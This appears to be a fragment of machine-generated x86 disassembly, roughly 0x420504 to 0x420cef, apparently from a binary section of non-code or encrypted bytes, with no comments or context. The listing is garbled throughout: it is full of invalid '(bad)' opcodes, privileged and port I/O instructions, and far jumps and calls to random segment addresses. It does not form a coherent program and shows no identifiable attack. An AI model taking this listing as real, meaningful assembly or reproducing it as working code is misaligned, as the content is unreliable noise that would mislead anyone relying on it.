  420504:	or     ebp,DWORD PTR [eax-0x1841771]
  42050a:	cmp    al,0xa6
  42050c:	or     ch,ch
  42050e:	push   ds
  42050f:	repnz bound ecx,QWORD PTR [ecx+eiz*1+0x5b]
  420514:	and    eax,DWORD PTR [esi]
  420516:	pop    es
  420517:	sbb    edi,ebp
  420519:	xchg   ecx,eax
  42051a:	push   ds
  42051b:	(bad)  
  42051c:	push   0xffffffe3
  42051e:	mov    dh,0xc
  420520:	jle    0x4204f5
  420522:	pop    es
  420523:	push   cs
  420524:	jne    0x420561
  420526:	jmp    0x4204da
  420528:	add    bh,ah
  42052a:	sbb    ebx,ebp
  42052c:	arpl   ax,cx
  42052e:	ror    DWORD PTR [ebx],0x66
  420531:	push   es
  420532:	fild   WORD PTR [ecx+0x2ccf3dc9]
  420538:	sti    
  420539:	dec    edx
  42053a:	cmp    esp,DWORD PTR [edi+0x5aee3abf]
  420540:	js     0x42053f
  420542:	es call 0x5f1c2b2
  420548:	push   ecx
  420549:	iret   
  42054a:	hlt    
  42054b:	sub    al,0x95
  42054d:	shr    DWORD PTR [eax+0x3653af96],cl
  420553:	cmp    DWORD PTR [edi-0x70],esp
  420556:	(bad)  
  42055a:	das    
  42055b:	inc    eax
  42055c:	frstor [edi+0x3e4a8a68]
  420562:	push   edx
  420563:	jl     0x42054d
  420565:	jg     0x420512
  420567:	inc    BYTE PTR [edi+0xb399158]
  42056d:	imul   DWORD PTR [edx+0x628289d7]
  420573:	in     al,0x39
  420575:	je     0x420556
  420577:	inc    esp
  420578:	repnz cmp dl,BYTE PTR ss:[esi+0x7e]
  42057d:	loopne 0x4205a1
  42057f:	popf   
  420580:	mov    bh,0x2b
  420582:	jno    0x420575
  420584:	lds    eax,FWORD PTR ds:0xfd00d889
  42058a:	arpl   WORD PTR [eax],bp
  42058c:	adc    al,0x6d
  42058e:	lds    edi,FWORD PTR [edi-0x25072b33]
  420594:	stc    
  420595:	add    bl,BYTE PTR [edi+0x2e]
  420598:	push   cs
  420599:	sbb    bh,BYTE PTR [eax]
  42059b:	das    
  42059c:	cdq    
  42059d:	push   ecx
  42059e:	int    0x3d
  4205a0:	xor    al,0x54
  4205a2:	cmp    eax,0xb3954d15
  4205a7:	or     bl,ah
  4205a9:	fimul  DWORD PTR [ecx-0x18725c41]
  4205af:	add    DWORD PTR ds:0x27722224,ecx
  4205b5:	outs   dx,BYTE PTR ds:[esi]
  4205b6:	dec    esi
  4205b7:	xchg   esp,eax
  4205b8:	bound  edx,QWORD PTR [ebp+0x7ce77157]
  4205be:	inc    edi
  4205bf:	sub    eax,0xfcca86a3
  4205c4:	fist   DWORD PTR [esi+0x75f55003]
  4205ca:	addr16 in al,dx
  4205cc:	imul   edi,DWORD PTR [ebp+0x37],0x64
  4205d0:	jmp    0x9d5b:0x835532a2
  4205d7:	jmp    0xc43f:0xc91d8ead
  4205de:	mov    al,ds:0x4ccbe878
  4205e3:	xchg   edx,eax
  4205e4:	or     eax,0x9f096565
  4205e9:	fild   QWORD PTR [esi+0x7b]
  4205ec:	dec    esp
  4205ed:	(bad)  
  4205ee:	xlat   BYTE PTR ds:[ebx]
  4205ef:	(bad)  
  4205f0:	push   cs
  4205f1:	and    al,0x6e
  4205f3:	ror    dl,cl
  4205f5:	sub    BYTE PTR ds:0x3c79608a,ch
  4205fb:	pop    esi
  4205fc:	cmc    
  4205fd:	mul    cl
  4205ff:	and    al,0x81
  420601:	jmp    0x7893845
  420606:	test   eax,0xe528d78c
  42060b:	sbb    eax,DWORD PTR [edx+0x455e24fd]
  420611:	dec    esi
  420612:	sub    eax,0x9a6b8ec0
  420617:	adc    esi,DWORD PTR [edi]
  420619:	cmp    DWORD PTR [eax],ebx
  42061b:	cmp    dh,BYTE PTR [ebx+edi*4]
  42061e:	pop    esp
  42061f:	and    esi,esp
  420621:	sbb    al,0x9f
  420623:	or     DWORD PTR [ecx],ebx
  420625:	retf   
  420626:	lock push esp
  420628:	ret    
  420629:	add    DWORD PTR [ecx+esi*2],edi
  42062c:	jb     0x420607
  42062e:	test   BYTE PTR [ebx],ch
  420630:	addr16 push ds
  420632:	inc    eax
  420633:	ret    
  420634:	scas   eax,DWORD PTR es:[edi]
  420635:	xor    BYTE PTR [ecx-0x5],0x1a
  420639:	jno    0x42069b
  42063b:	add    al,0x13
  42063d:	ds (bad) 
  42063f:	push   ecx
  420640:	fwait
  420641:	pushf  
  420642:	sub    BYTE PTR [eax],0x8a
  420645:	int    0x22
  420647:	(bad)  
  420648:	(bad)  
  42064a:	int    0x7d
  42064c:	test   eax,0xbd45aa61
  420651:	ins    DWORD PTR es:[edi],dx
  420652:	xchg   ebx,eax
  420653:	add    al,0x69
  420655:	xor    dl,BYTE PTR [ebx+0x6a]
  420658:	icebp  
  420659:	in     eax,dx
  42065a:	cwde   
  42065b:	mov    edi,0x46cdf9dc
  420660:	bsr    ecx,DWORD PTR ss:[esi]
  420664:	sbb    al,0x6e
  420666:	push   ebp
  420667:	lock push 0x5aac8a58
  42066d:	xor    BYTE PTR [ecx-0x35c924f2],0xe
  420674:	adc    dl,dh
  420676:	clc    
  420677:	sbb    ecx,DWORD PTR [ebp+0x26]
  42067a:	ret    
  42067b:	bound  edi,QWORD PTR [esi-0x7cb839d8]
  420681:	fstp   DWORD PTR ds:0x3f52cd87
  420687:	mov    dh,0x24
  420689:	mov    eax,ds:0x85247994
  42068e:	jg     0x4206ad
  420690:	mov    ebp,0x4d680bc2
  420695:	outs   dx,BYTE PTR ds:[esi]
  420696:	jmp    0x8eb9:0xc80d4350
  42069d:	mov    dh,0x51
  42069f:	mov    eax,ds:0xf828a9a1
  4206a4:	loope  0x4206d6
  4206a6:	(bad)  
  4206a7:	div    BYTE PTR [ebx+0x1e]
  4206aa:	int    0xad
  4206ac:	bound  edx,QWORD PTR [ebx]
  4206ae:	cmp    BYTE PTR ds:[eax+0x5b],0x9a
  4206b3:	mov    ds:0xc3dd66e3,eax
  4206b8:	mov    edi,0x601f7034
  4206bd:	cld    
  4206be:	add    BYTE PTR [ecx+0x118645f7],bh
  4206c4:	dec    edx
  4206c5:	dec    ecx
  4206c6:	ins    BYTE PTR es:[edi],dx
  4206c7:	cmp    eax,0x40b9bd38
  4206cc:	xchg   ebx,eax
  4206cd:	fcomp  QWORD PTR [eax]
  4206cf:	jmp    FWORD PTR [ebx+0x42d047af]
  4206d5:	in     eax,dx
  4206d6:	test   eax,0xeb372e83
  4206db:	shr    DWORD PTR [eax-0x184a6760],0x25
  4206e2:	scas   al,BYTE PTR es:[edi]
  4206e3:	ss and eax,0xad316846
  4206e9:	sub    ebp,DWORD PTR [eax+0x577274cf]
  4206ef:	sbb    al,BYTE PTR [edi]
  4206f1:	dec    ebp
  4206f2:	sar    esi,1
  4206f4:	int    0x3a
  4206f6:	and    DWORD PTR [esi],esp
  4206f8:	outs   dx,DWORD PTR ds:[esi]
  4206f9:	sbb    edi,esi
  4206fb:	loop   0x420750
  4206fd:	mov    bl,0x3f
  4206ff:	fldcw  WORD PTR [eax-0x23cff561]
  420705:	cmp    eax,0x20db2e46
  42070a:	cwde   
  42070b:	pop    ss
  42070c:	out    0x59,eax
  42070e:	mov    esi,0x41d0dc1c
  420713:	xchg   ecx,eax
  420714:	inc    esi
  420715:	fwait
  420716:	xchg   DWORD PTR [ecx-0x66],ebx
  420719:	js     0x420783
  42071b:	sub    DWORD PTR [esi-0x22f46cbd],ebx
  420721:	push   es
  420722:	ins    BYTE PTR es:[edi],dx
  420723:	call   0xe09a:0x9c674580
  42072a:	push   esi
  42072b:	daa    
  42072c:	pop    ebp
  42072d:	fsub   QWORD PTR ds:[ecx]
  420730:	clc    
  420731:	and    BYTE PTR [edx+0x5461a1e7],bl
  420737:	sub    al,0x86
  420739:	inc    esi
  42073a:	mov    ch,0xf3
  42073c:	inc    ebx
  42073d:	xchg   DWORD PTR [ebx+0x4ca9587b],ebx
  420743:	mov    DWORD PTR [edi+0x164aaa2f],edx
  420749:	and    al,0x69
  42074b:	dec    edi
  42074c:	mov    ecx,0x61d24d
  420751:	imul   ebx,DWORD PTR [edx],0xd5fcf8f
  420757:	arpl   WORD PTR [esp+esi*4-0x56459b49],ax
  42075e:	fwait
  42075f:	jle    0x4207df
  420761:	adc    DWORD PTR [ebx],ebx
  420763:	xchg   ebx,eax
  420764:	(bad)  
  420765:	rep outs dx,DWORD PTR ds:[esi]
  420767:	ins    DWORD PTR es:[edi],dx
  420768:	dec    DWORD PTR [edx+0x2f]
  42076b:	add    DWORD PTR [edi+0x32079d2d],ecx
  420771:	pusha  
  420772:	xor    BYTE PTR [eax+0x5b],ah
  420775:	mov    BYTE PTR ds:0x1a4b4347,0x40
  42077c:	pusha  
  42077d:	inc    edi
  42077e:	jge    0x42075a
  420780:	jge    0x420752
  420782:	shl    BYTE PTR [ebx],1
  420784:	and    al,0x17
  420786:	sub    DWORD PTR [eax],0xffffffa8
  420789:	js     0x420739
  42078b:	daa    
  42078c:	xchg   edx,eax
  42078d:	stos   BYTE PTR es:[edi],al
  42078e:	cmp    al,0x61
  420790:	fist   DWORD PTR [ebp+eax*8-0x652d524b]
  420797:	(bad)  
  420799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42079a:	mov    dl,0x4b
  42079c:	stos   DWORD PTR es:[edi],eax
  42079d:	push   ss
  42079e:	cmp    ebp,ecx
  4207a0:	mov    ebx,0xb6de8dbb
  4207a5:	daa    
  4207a6:	inc    ecx
  4207a7:	cli    
  4207a8:	daa    
  4207a9:	out    0x7c,al
  4207ab:	mov    bh,0x46
  4207ad:	sbb    eax,0x85f0716d
  4207b2:	mov    eax,0xec4ca0aa
  4207b7:	xor    eax,0x9f0fba9
  4207bc:	mov    edi,DWORD PTR [ecx-0x5b6bb1a]
  4207c2:	push   esi
  4207c3:	lods   eax,DWORD PTR ds:[esi]
  4207c4:	xor    ebx,ebx
  4207c6:	(bad)  
  4207c7:	(bad)  [ebp+ebx*8+0x69]
  4207cb:	out    dx,al
  4207cc:	xor    dl,BYTE PTR [edi-0x59]
  4207cf:	js     0x4207a3
  4207d1:	stos   DWORD PTR es:[edi],eax
  4207d2:	pop    edx
  4207d3:	pop    ds
  4207d4:	jo     0x420800
  4207d6:	fld    TBYTE PTR [ebp-0x2a70935e]
  4207dc:	das    
  4207dd:	data16 xor dh,bl
  4207e0:	pop    ecx
  4207e1:	stos   DWORD PTR es:[edi],eax
  4207e2:	out    dx,al
  4207e3:	shl    BYTE PTR [ebp-0x4e],0x48
  4207e7:	int    0x2e
  4207e9:	sub    eax,0x8221cc3
  4207ee:	mov    ch,0x2f
  4207f0:	push   eax
  4207f1:	mov    eax,ds:0xd4a1b553
  4207f6:	cmp    eax,0xee53a8e5
  4207fb:	jns    0x42080d
  4207fd:	push   ss
  4207fe:	mov    bh,0xcf
  420800:	sub    al,0x3a
  420802:	mov    esi,0xafc71c39
  420807:	ins    DWORD PTR es:[edi],dx
  420808:	dec    ecx
  420809:	inc    esi
  42080a:	cdq    
  42080b:	clc    
  42080c:	fidivr DWORD PTR ss:[ebx-0x18]
  420810:	sub    esi,DWORD PTR [ebp+0x2cd2c42e]
  420816:	cmp    esp,DWORD PTR [edi]
  420818:	in     eax,dx
  420819:	cmp    ebx,DWORD PTR [esi+0x25]
  42081c:	sbb    BYTE PTR [ebp-0x44024dd2],al
  420822:	call   0x8c68:0x41c92bca
  420829:	push   cs
  42082a:	xchg   esi,eax
  42082b:	sub    DWORD PTR [ecx],eax
  42082d:	sti    
  42082e:	jecxz  0x42086c
  420830:	and    BYTE PTR [eax-0x4b],bl
  420833:	retf   0x132c
  420836:	call   0x1ea13e26
  42083b:	popf   
  42083c:	shl    BYTE PTR [edx],1
  42083e:	bound  esp,QWORD PTR [esi+0x2]
  420841:	jl     0x4208b7
  420843:	cs das 
  420845:	into   
  420846:	jl     0x4207f0
  420848:	and    edx,DWORD PTR [eax+0x7d]
  42084b:	xchg   ebx,eax
  42084c:	push   ds
  42084d:	and    eax,0xe7993cd5
  420852:	das    
  420853:	mov    esi,0xc608c9cb
  420858:	loop   0x420888
  42085a:	shr    DWORD PTR [ebx+ebx*4-0x5f],cl
  42085e:	in     al,dx
  42085f:	out    dx,al
  420860:	and    ebx,edx
  420862:	daa    
  420863:	jb     0x420873
  420865:	daa    
  420866:	push   0x7954978
  42086b:	aam    0x37
  42086d:	mov    ah,0x5c
  42086f:	fisttp WORD PTR [esi]
  420871:	fistp  WORD PTR [esi+ebx*4+0x17e5ade3]
  420878:	pop    ebx
  420879:	pop    ds
  42087a:	aaa    
  42087b:	in     al,dx
  42087c:	xchg   DWORD PTR [edi],edx
  42087e:	adc    eax,0xe841a033
  420883:	pop    ebp
  420884:	cmp    ch,0x55
  420887:	mov    ebx,0x3e68769f
  42088c:	out    0x14,eax
  42088e:	stos   BYTE PTR es:[edi],al
  42088f:	(bad)
  420892:	add    BYTE PTR [edi-0x63],ch
  420895:	loope  0x420859
  420897:	mov    cl,0xaa
  420899:	mov    ch,BYTE PTR [esi+0x2bc03522]
  42089f:	shl    BYTE PTR [ebx-0x40cefb0e],cl
  4208a5:	test   al,0x13
  4208a7:	push   es
  4208a8:	xchg   edi,edx
  4208aa:	push   es
  4208ab:	pop    ebp
  4208ac:	or     bh,BYTE PTR [edx]
  4208ae:	arpl   WORD PTR [esp+edx*8+0x4b],di
  4208b2:	lea    edx,[edx+0x8fa7ebd]
  4208b8:	sub    al,BYTE PTR [edx+0x8]
  4208bb:	int3   
  4208bc:	inc    ecx
  4208bd:	stos   DWORD PTR es:[edi],eax
  4208be:	jo     0x420917
  4208c0:	loopne 0x420888
  4208c2:	pop    es
  4208c3:	xchg   ebp,eax
  4208c4:	jb     0x42086b
  4208c6:	add    ebx,ecx
  4208c8:	loope  0x420895
  4208ca:	ficom  WORD PTR [ecx-0x41d88561]
  4208d0:	inc    edx
  4208d1:	(bad)  
  4208d2:	mov    eax,0xe08bcc2d
  4208d7:	test   DWORD PTR [esi],0xa3621aa3
  4208dd:	cmp    ecx,edi
  4208df:	sub    DWORD PTR [ecx-0x3a084b70],0x81085803
  4208e9:	adc    ch,BYTE PTR [edi]
  4208eb:	pop    ds
  4208ec:	(bad)
  4208ef:	jl     0x4208e1
  4208f1:	jmp    0x7909:0xac9b6bb
  4208f8:	loopne 0x4208d7
  4208fa:	dec    edx
  4208fb:	mov    ds:0xb3aa98ef,al
  420900:	or     al,0x75
  420902:	push   ebp
  420903:	ret    
  420904:	jo     0x420900
  420906:	int    0x82
  420908:	mov    edx,0xadec62c5
  42090d:	add    ecx,DWORD PTR ds:0x92f5e8d9
  420913:	data16 mov BYTE PTR [ecx-0x61],al
  420917:	iret   
  420918:	inc    esp
  420919:	stc    
  42091a:	out    dx,al
  42091b:	push   0xffffff9a
  42091d:	mov    cl,0x38
  42091f:	sbb    DWORD PTR [edi-0x5d],esi
  420922:	arpl   WORD PTR [edi+0x1be3c23],cx
  420928:	push   es
  420929:	xchg   esi,eax
  42092a:	add    eax,0xa464dfc8
  42092f:	sub    al,dl
  420931:	pop    esi
  420932:	jge    0x420964
  420934:	or     DWORD PTR [eax],0x18
  420937:	js     0x4209b8
  420939:	ds cmp al,0xd6
  42093c:	adc    eax,0x6b57470b
  420941:	fadd   QWORD PTR cs:[edx+0x6562484b]
  420948:	shl    DWORD PTR [edi+0x427eebdb],1
  42094e:	xor    BYTE PTR [eax+ebp*4-0x60],0xd6
  420953:	push   eax
  420954:	dec    ecx
  420955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420956:	(bad)  
  420957:	jb     0x4208fc
  420959:	aam    0x22
  42095b:	dec    ebp
  42095c:	and    eax,0x2f2585ee
  420961:	enter  0xf7f,0x16
  420965:	jne    0x420974
  420967:	push   edx
  420968:	pop    ds
  420969:	js     0x4208ff
  42096b:	and    ebx,DWORD PTR [edi-0x2]
  42096e:	nop
  42096f:	mov    eax,0xffe3b50c
  420974:	ret    
  420975:	jg     0x420928
  420977:	mov    ah,0x4a
  420979:	push   edx
  42097a:	cmp    BYTE PTR [eax+0x6acc45b8],cl
  420980:	push   ss
  420981:	mov    ebx,0x6e33bf68
  420986:	fcomp  QWORD PTR [ecx]
  420988:	fwait
  420989:	je     0x420917
  42098b:	mov    cl,0x5b
  42098d:	mov    ebp,0x20ea95fe
  420992:	jmp    0x42098d
  420994:	fist   DWORD PTR [esi+edx*1]
  420997:	lahf   
  420998:	aaa    
  420999:	dec    edx
  42099a:	jb     0x420923
  42099c:	sbb    BYTE PTR [eax],0x99
  42099f:	bound  edi,QWORD PTR [esi+0x55]
  4209a2:	mov    ch,0xf7
  4209a4:	add    eax,0xdfbc45ea
  4209a9:	jne    0x420998
  4209ab:	cld    
  4209ac:	push   edx
  4209ad:	fmul   QWORD PTR [esi]
  4209af:	push   ss
  4209b0:	ds repnz stc 
  4209b3:	jae    0x4209d8
  4209b5:	test   al,0x50
  4209b7:	aas    
  4209b8:	pop    ds
  4209b9:	lods   eax,DWORD PTR ds:[esi]
  4209ba:	test   eax,0xe41fe253
  4209bf:	loop   0x420a1d
  4209c1:	jecxz  0x4209f0
  4209c3:	cld    
  4209c4:	jmp    0x420986
  4209c6:	std    
  4209c7:	mov    al,0xe6
  4209c9:	out    0x24,eax
  4209cb:	loope  0x4209c2
  4209cd:	push   ds
  4209ce:	retf   0x1004
  4209d1:	mov    dh,0xd2
  4209d3:	bound  esp,QWORD PTR [esi-0x64]
  4209d6:	shr    DWORD PTR [edi-0x44],cl
  4209d9:	mov    cs,edi
  4209db:	lods   al,BYTE PTR ds:[esi]
  4209dc:	xchg   BYTE PTR [edi+eax*8-0x2d],ch
  4209e0:	add    bl,al
  4209e2:	sbb    eax,0x1423d5bd
  4209e7:	aaa    
  4209e8:	call   0xd127:0x5248864a
  4209ef:	js     0x4209a3
  4209f1:	jnp    0x420a31
  4209f3:	icebp  
  4209f4:	push   0xffffffb6
  4209f6:	cmp    DWORD PTR [edx-0x436169fe],esi
  4209fc:	mov    ebx,0xe77f865c
  420a01:	cmp    al,0xfe
  420a03:	cli    
  420a04:	cmp    esp,DWORD PTR [ebx-0x76a94893]
  420a0a:	push   ebp
  420a0b:	scas   al,BYTE PTR es:[edi]
  420a0c:	sahf   
  420a0d:	xchg   BYTE PTR [eax+0x7a],ch
  420a10:	push   ds
  420a11:	outs   dx,BYTE PTR ds:[esi]
  420a12:	test   eax,0x3bd8132a
  420a17:	jb     0x4209b9
  420a19:	rcl    edi,cl
  420a1b:	mov    ecx,0xda291d04
  420a20:	imul   edi,DWORD PTR [edi+ebx*1+0x72],0xd88a5114
  420a28:	mov    eax,0x1c7343c4
  420a2d:	bswap  edx
  420a2f:	sub    al,ch
  420a31:	repnz hlt 
  420a33:	mov    ds:0xbb7ad3e0,al
  420a38:	or     ebx,0x33
  420a3b:	add    esi,DWORD PTR [ebp+0xc]
  420a3e:	xchg   esp,eax
  420a3f:	ret    0xbdb4
  420a42:	ret    
  420a43:	je     0x420a58
  420a45:	fmul   DWORD PTR [edi+ebp*2+0x5a]
  420a49:	rcr    DWORD PTR [ebp+0x343d93d2],cl
  420a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a50:	adc    DWORD PTR [esp+eiz*2],ebp
  420a53:	lods   eax,DWORD PTR ds:[esi]
  420a54:	and    DWORD PTR [eax+0x65],edi
  420a57:	outs   dx,DWORD PTR ds:[esi]
  420a58:	adc    al,0xe6
  420a5a:	and    DWORD PTR [edi-0x4c],esi
  420a5d:	and    eax,DWORD PTR [ecx+eiz*1-0x6829f9e7]
  420a64:	inc    eax
  420a65:	jmp    0x44eebe48
  420a6a:	mov    ch,BYTE PTR [eax]
  420a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a6d:	int3   
  420a6e:	adc    BYTE PTR [ebx+eiz*8+0xd7643e4],ah
  420a75:	xor    ch,0x36
  420a78:	sub    ah,al
  420a7a:	les    ebp,FWORD PTR [edx+eiz*2-0x6f067eb]
  420a81:	unpcklps xmm4,XMMWORD PTR [edi-0x7f540854]
  420a88:	ss push cs
  420a8a:	jmp    0x420a34
  420a8c:	(bad)  
  420a8d:	shr    BYTE PTR [ebx+0x70154636],cl
  420a93:	mov    ecx,0x2d26b33e
  420a98:	neg    DWORD PTR [edx]
  420a9a:	rol    BYTE PTR [edx-0x2d193e88],1
  420aa0:	jno    0x420af8
  420aa2:	popa   
  420aa3:	xor    cl,BYTE PTR [edx+ebp*2+0x43]
  420aa7:	je     0x420b0e
  420aa9:	push   ebx
  420aaa:	xor    al,0xef
  420aac:	sub    DWORD PTR [ecx+0x58210785],edx
  420ab2:	mov    dl,0x12
  420ab4:	add    esp,edx
  420ab6:	pop    es
  420ab7:	xor    edx,0xeeb2b9f0
  420abd:	imul   edx,DWORD PTR [esi+0x2fcb74cb],0x8
  420ac4:	pop    ebx
  420ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ac6:	gs mov eax,0x60d6dbbd
  420acc:	xchg   ecx,eax
  420acd:	mov    ch,0x16
  420acf:	and    al,0x1b
  420ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ad2:	jbe    0x420b04
  420ad4:	daa    
  420ad5:	dec    esp
  420ad6:	mov    cl,BYTE PTR [ebx+0x2a6cb3c]
  420adc:	gs pop edi
  420ade:	popa   
  420adf:	adc    dl,0xd0
  420ae2:	arpl   WORD PTR [edi-0x58],ax
  420ae5:	pop    edi
  420ae6:	and    eax,DWORD PTR [ecx]
  420ae8:	repnz push es
  420aea:	jge    0x420a6d
  420aec:	ss pop es
  420aee:	ja     0x420b5d
  420af0:	cmp    al,0x3a
  420af2:	cmp    esp,DWORD PTR [esp+ecx*8+0x2461d5f7]
  420af9:	stc    
  420afa:	or     esi,esi
  420afc:	xchg   edi,eax
  420afd:	(bad)  
  420aff:	add    al,0x12
  420b01:	dec    eax
  420b02:	mov    al,ds:0x2bc89bd4
  420b07:	(bad)  
  420b08:	arpl   di,sp
  420b0a:	int3   
  420b0b:	push   cs
  420b0c:	test   ebx,ebp
  420b0e:	xor    eax,0xd9661d1c
  420b13:	mov    ss,WORD PTR [ecx+0x1a]
  420b16:	and    ecx,DWORD PTR [ecx+0x3c]
  420b19:	popf   
  420b1a:	fldcw  WORD PTR [esi-0x4a]
  420b1d:	or     DWORD PTR [ebp+0x5],ebp
  420b20:	into   
  420b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b22:	cwde   
  420b23:	aas    
  420b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b25:	mov    ds:0x7fda3dbc,eax
  420b2a:	sbb    DWORD PTR [esi+0x1f],ecx
  420b2d:	jns    0x420b85
  420b2f:	xchg   ebp,eax
  420b30:	cmp    al,0xfd
  420b32:	mov    dh,0xc0
  420b34:	test   eax,0xe2d1c42a
  420b39:	mov    al,0xaa
  420b3b:	call   0xcbfb:0x8516988d
  420b42:	fldl2e 
  420b44:	ss dec esi
  420b46:	sub    al,0xb8
  420b48:	mov    dl,0x93
  420b4a:	xchg   sp,ax
  420b4c:	xchg   edx,eax
  420b4d:	cmp    al,BYTE PTR [edi-0x57]
  420b50:	sbb    al,0xc7
  420b52:	pop    ebp
  420b53:	mov    ebx,DWORD PTR [edi+0x5]
  420b56:	jae    0x420ae5
  420b58:	and    al,0x4c
  420b5a:	test   bl,bh
  420b5c:	and    BYTE PTR [edi+0x4f],ah
  420b5f:	in     al,0xd2
  420b61:	fstp   TBYTE PTR [esi+ebx*1+0x5d]
  420b65:	popf   
  420b66:	enter  0x208c,0x64
  420b6a:	sub    DWORD PTR [esi],eax
  420b6c:	jno    0x420af1
  420b6e:	call   0x883e:0x5c5b18ee
  420b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b76:	inc    esi
  420b77:	mov    al,0x29
  420b79:	rcl    DWORD PTR [ebx+ebp*2+0x0],1
  420b7d:	or     BYTE PTR [ebx],bh
  420b7f:	jae    0x420b03
  420b81:	imul   edi,DWORD PTR [ecx-0x33],0xafd3670b
  420b88:	jp     0x420b52
  420b8a:	xchg   edx,eax
  420b8b:	cmc    
  420b8c:	jo     0x420b15
  420b8e:	repnz push ecx
  420b90:	test   esp,ecx
  420b92:	rcr    BYTE PTR [eax-0x3f],cl
  420b95:	mov    ecx,0xba70bb6
  420b9a:	lds    ecx,FWORD PTR [ebx+0x678178a1]
  420ba0:	sub    BYTE PTR [edx],al
  420ba2:	xchg   ebp,eax
  420ba3:	out    0x1e,eax
  420ba5:	test   BYTE PTR [esi-0x7281281b],0x71
  420bac:	leave  
  420bad:	imul   ebx,DWORD PTR [edi+ebx*2-0x7a0f07cf],0x6c
  420bb5:	and    ebp,DWORD PTR [eax+0x8]
  420bb8:	shrd   eax,ebp,0xa1
  420bbc:	pop    eax
  420bbd:	dec    esi
  420bbe:	das    
  420bbf:	test   BYTE PTR [esi],al
  420bc1:	pop    ecx
  420bc2:	dec    eax
  420bc3:	inc    edi
  420bc4:	test   eax,0x69ecc078
  420bc9:	pop    esi
  420bca:	sahf   
  420bcb:	cmp    DWORD PTR [edi+esi*2],ebp
  420bce:	popf   
  420bcf:	dec    esi
  420bd0:	add    eax,0x335f0b6a
  420bd5:	into   
  420bd6:	clc    
  420bd7:	lahf   
  420bd8:	and    al,0xd8
  420bda:	pop    bx
  420bdc:	sub    dl,dh
  420bde:	add    esp,DWORD PTR [edi-0x64]
  420be1:	xor    al,ch
  420be3:	xchg   BYTE PTR [esi-0x6d],bl
  420be6:	xchg   ebp,eax
  420be7:	push   cs
  420be8:	inc    edi
  420be9:	iret   
  420bea:	mov    esp,0x78f6e27f
  420bef:	mov    BYTE PTR [edi+0x45],bh
  420bf2:	(bad)  
  420bf3:	test   eax,0xadee4122
  420bf8:	inc    ebp
  420bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bfa:	clc    
  420bfb:	mov    ecx,0x43f36476
  420c00:	xchg   ebx,eax
  420c01:	xchg   ebx,eax
  420c02:	rol    BYTE PTR [eax],1
  420c04:	pop    edx
  420c05:	sub    al,BYTE PTR [ebp+ebx*2+0x2a680bad]
  420c0c:	das    
  420c0d:	mov    edi,0x5b708569
  420c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c13:	fdiv   st,st(1)
  420c15:	pop    edx
  420c16:	or     al,0x2
  420c18:	loop   0x420bf1
  420c1a:	pop    edx
  420c1b:	adc    DWORD PTR [ebx],ebp
  420c1d:	xor    al,0xe2
  420c1f:	retf   0xa172
  420c22:	mov    ch,0xea
  420c24:	mov    ecx,0xea1bfe1a
  420c29:	repnz inc edi
  420c2b:	test   BYTE PTR [edx+0x5a34a26f],0x46
  420c32:	out    0x3c,al
  420c34:	push   0xe5e2e339
  420c39:	mov    esi,0x3de14497
  420c3e:	lock xchg ecx,eax
  420c40:	retf   
  420c41:	jno    0x420c9a
  420c43:	cwde   
  420c44:	push   edi
  420c45:	push   ss
  420c46:	xor    edx,DWORD PTR [eax-0x1a]
  420c49:	xchg   DWORD PTR [edi-0x6fe1ef32],esp
  420c4f:	fcomp  DWORD PTR [ebp-0x80]
  420c52:	leave  
  420c53:	cmp    al,0x61
  420c55:	inc    ebp
  420c56:	dec    edi
  420c57:	(bad)  
  420c58:	xchg   edi,eax
  420c59:	icebp  
  420c5a:	outs   dx,DWORD PTR ds:[esi]
  420c5b:	out    dx,al
  420c5c:	cmp    eax,0xf80e359b
  420c61:	fisub  DWORD PTR [ebx-0x3c80d836]
  420c67:	not    BYTE PTR [ebx-0x69b97d7c]
  420c6d:	cmp    al,0xad
  420c6f:	pop    edi
  420c70:	push   edx
  420c71:	shr    ecx,0xe8
  420c74:	cld    
  420c75:	ins    DWORD PTR es:[edi],dx
  420c76:	inc    esi
  420c77:	adc    DWORD PTR [edx+0x24],edx
  420c7a:	into   
  420c7b:	xchg   ecx,eax
  420c7c:	loop   0x420c4f
  420c7e:	dec    ecx
  420c7f:	adc    BYTE PTR [esi+0x3ccff602],dl
  420c85:	ret    0x6d3f
  420c88:	nop
  420c89:	adc    al,0xdc
  420c8b:	add    ebx,ebx
  420c8d:	je     0x420cd7
  420c8f:	and    DWORD PTR [ecx],edx
  420c91:	(bad)  
  420c92:	in     al,dx
  420c93:	cld    
  420c94:	sbb    eax,0xd27a39da
  420c99:	mov    ah,dl
  420c9b:	cs cli 
  420c9d:	jb     0x420ce4
  420c9f:	repz dec ebx
  420ca1:	jo     0x420c65
  420ca3:	and    dl,BYTE PTR [edi+0x47]
  420ca6:	xchg   edx,eax
  420ca7:	adc    al,0xa3
  420ca9:	cmp    al,0xf9
  420cab:	repnz ins BYTE PTR es:[edi],dx
  420cad:	jae    0x420cad
  420caf:	jo     0x420c8d
  420cb1:	outs   dx,BYTE PTR ds:[esi]
  420cb2:	lock pop ebp
  420cb4:	scas   eax,DWORD PTR es:[edi]
  420cb5:	sbb    ch,BYTE PTR ds:0x7b7d126e
  420cbb:	inc    si
  420cbd:	call   ebp
  420cbf:	inc    dx
  420cc1:	in     eax,dx
  420cc2:	jno    0x420cf4
  420cc4:	xor    eax,0x3de256ea
  420cc9:	inc    ebx
  420cca:	dec    eax
  420ccb:	cmp    al,0x96
  420ccd:	lahf   
  420cce:	mov    ds:0x798bbc32,al
  420cd3:	xchg   dl,al
  420cd5:	cmp    al,0x60
  420cd7:	mov    dl,0xfc
  420cd9:	inc    esp
  420cda:	cmp    eax,0xf88eb273
  420cdf:	into   
  420ce0:	test   al,0x52
  420ce2:	mov    esp,0xd7133355
  420ce7:	mov    dh,0xe8
  420ce9:	imul   esp,DWORD PTR [eax],0x91d16c56
  420cef:	add    DWORD PTR [ecx],0x19b85334
